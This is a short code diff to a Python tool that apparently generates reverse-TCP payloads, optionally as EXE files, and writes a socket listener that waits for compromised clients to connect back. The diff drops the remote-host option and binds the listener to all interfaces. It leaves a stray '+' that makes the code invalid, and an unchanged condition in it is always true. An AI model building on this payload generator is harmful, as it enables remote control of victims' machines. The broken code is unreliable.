@@ -7,7 +7,7 @@ def args():
     parser.add_argument('-p', '--payload', help='The Payload Type. Example: python/reverse_tcp')
     parser.add_argument('-x', '--executable', help="Make Payload an EXE File. Values: true, false.")
     parser.add_argument('-l', '--lhost', help="Listen Host")
-    parser.add_argument('-r', '--rhost', help="Remote Host's IP Address")
+
     args = parser.parse_args()
 def check_exe():
     if args.executable == "false" or "False":
@@ -46,9 +46,9 @@ while True:
     file2.write('''
 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = "''' + str(args.rhost) + 
-'''"\nport = 51948
-s.bind((host, port))
++ 
+port = 51948
+s.bind(("", port))
 s.listen(50)
 print "{+} TCP Server Started, waiting for client to connect..."
 conn, addr = s.accept()
